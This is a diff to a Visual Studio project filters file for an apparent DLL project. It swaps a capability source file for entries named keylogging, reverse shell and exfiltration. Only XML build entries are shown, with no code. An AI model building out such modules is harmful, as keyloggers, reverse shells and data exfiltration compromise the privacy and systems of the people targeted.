@@ -24,6 +24,18 @@
     <ClInclude Include="capability.h">
       <Filter>Source Files</Filter>
     </ClInclude>
+    <ClInclude Include="resource.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="keylogging.h">
+      <Filter>Source Files</Filter>
+    </ClInclude>
+    <ClInclude Include="reverseshell.h">
+      <Filter>Source Files</Filter>
+    </ClInclude>
+    <ClInclude Include="exfiltration.h">
+      <Filter>Source Files</Filter>
+    </ClInclude>
   </ItemGroup>
   <ItemGroup>
     <ClCompile Include="dllmain.cpp">
@@ -32,7 +44,13 @@
     <ClCompile Include="pch.cpp">
       <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="capability.cpp">
+    <ClCompile Include="keylogging.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="reverseshell.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="exfiltration.cpp">
       <Filter>Source Files</Filter>
     </ClCompile>
   </ItemGroup>
